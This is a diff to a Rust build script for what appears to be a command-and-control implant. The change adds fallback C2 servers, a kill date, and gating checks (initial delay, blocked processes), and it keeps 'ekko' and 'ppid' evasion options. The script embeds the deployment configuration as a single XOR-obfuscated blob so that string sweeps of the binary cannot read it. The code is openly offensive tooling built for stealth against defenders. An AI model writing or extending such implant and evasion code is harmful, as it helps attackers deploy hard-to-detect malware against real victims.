@@ -5,22 +5,25 @@
 //!
 //! ```json
 //! {
-//!   "server": "c2.example.com:443",
+//!   "servers": ["c2.example.com:443", "backup.example.com:443"],
 //!   "key": "<64-hex ed25519 public key>",
 //!   "tls_pin": "<64-hex sha256 of the leaf cert DER, or empty>",
 //!   "evasion": "ekko,ppid",
-//!   "profile": "<inline malleable profile YAML, or empty>"
+//!   "profile": "<inline malleable profile YAML, or empty>",
+//!   "kill_date": 0,
+//!   "gates": {"initial_delay_max_secs": 0, "blocked_processes": []}
 //! }
 //! ```
 //!
-//! The parsed fields are serialized into a fixed length-prefixed layout,
-//! XOR-encrypted with a random keystream generated at build time and
-//! emitted as two constant arrays in OUT_DIR. The operational binary
-//! therefore contains neither the configuration in plain text nor the
-//! command-line flag surface (which only exists behind the `lab-args`
-//! feature). No cryptographic strength is claimed for the XOR — it exists
-//! so that plain-text strings sweeps do not trivially read the deployment
-//! parameters.
+//! `server` (single string) is accepted as a legacy alias for
+//! `servers`. The whole file is parsed, validated, re-serialized
+//! compactly and embedded as ONE blob: [u32 len][bytes], XOR-encrypted
+//! with a build-random keystream and emitted as two constant arrays in
+//! OUT_DIR. The operational binary therefore contains neither the
+//! configuration in plain text nor the command-line flag surface
+//! (which only exists behind the `lab-args` feature). No cryptographic
+//! strength is claimed for the XOR — it exists so that plain-text
+//! string sweeps do not trivially read the deployment parameters.
 
 use std::env;
 use std::fs;
@@ -33,37 +36,49 @@ fn main() {
         println!("cargo:rerun-if-changed={embed}");
     }
 
-    let mut fields: Vec<Vec<u8>> = vec![Vec::new(); 5];
+    let mut blob = Vec::new();
     if !embed.is_empty() {
         let text = fs::read_to_string(Path::new(&embed))
             .unwrap_or_else(|e| panic!("ABRAHAM_EMBED {}: {e}", embed));
-        let json: serde_json::Value =
+        let mut json: serde_json::Value =
             serde_json::from_str(&text).unwrap_or_else(|e| panic!("ABRAHAM_EMBED {}: {e}", embed));
-        let str_field = |name: &str| -> String {
-            json.get(name)
-                .and_then(|v| v.as_str())
-                .unwrap_or("")
-                .to_string()
-        };
-        fields = vec![
-            str_field("server").into_bytes(),
-            str_field("key").into_bytes(),
-            str_field("tls_pin").into_bytes(),
-            str_field("evasion").into_bytes(),
-            str_field("profile").into_bytes(),
-        ];
-        if fields[0].is_empty() || fields[1].is_empty() {
-            panic!("ABRAHAM_EMBED {}: server and key are required", embed);
+        // Legacy single-server alias.
+        if json.get("servers").is_none() {
+            if let Some(server) = json.get("server").and_then(|v| v.as_str()) {
+                json["servers"] =
+                    serde_json::Value::Array(vec![serde_json::Value::String(server.to_string())]);
+            }
         }
+        let servers = json
+            .get("servers")
+            .and_then(|v| v.as_array())
+            .map(|list| {
+                list.iter()
+                    .filter_map(|v| v.as_str().map(str::to_string))
+                    .collect::<Vec<_>>()
+            })
+            .unwrap_or_default();
+        if servers.is_empty() {
+            panic!("ABRAHAM_EMBED {embed}: servers (or legacy server) is required");
+        }
+        if json
+            .get("key")
+            .and_then(|v| v.as_str())
+            .unwrap_or("")
+            .is_empty()
+        {
+            panic!("ABRAHAM_EMBED {embed}: key is required");
+        }
+        // Compact re-serialization: whitespace and key order of the
+        // source file must not leak into the artifact.
+        blob = serde_json::to_vec(&json).expect("re-serialize embed json");
     }
 
-    // Fixed layout: [u16 len][bytes] per field, five fields in order.
-    let mut plain = Vec::new();
-    for field in &fields {
-        let len = u16::try_from(field.len()).expect("embedded field exceeds u16 length");
-        plain.extend_from_slice(&len.to_be_bytes());
-        plain.extend_from_slice(field);
-    }
+    // Single-blob layout: [u32 len][bytes].
+    let mut plain = Vec::with_capacity(blob.len() + 4);
+    let len = u32::try_from(blob.len()).expect("embedded config exceeds u32 length");
+    plain.extend_from_slice(&len.to_be_bytes());
+    plain.extend_from_slice(&blob);
 
     // Build-random xorshift64 keystream, seeded from clock and pid so every
     // build produces a distinct stream.
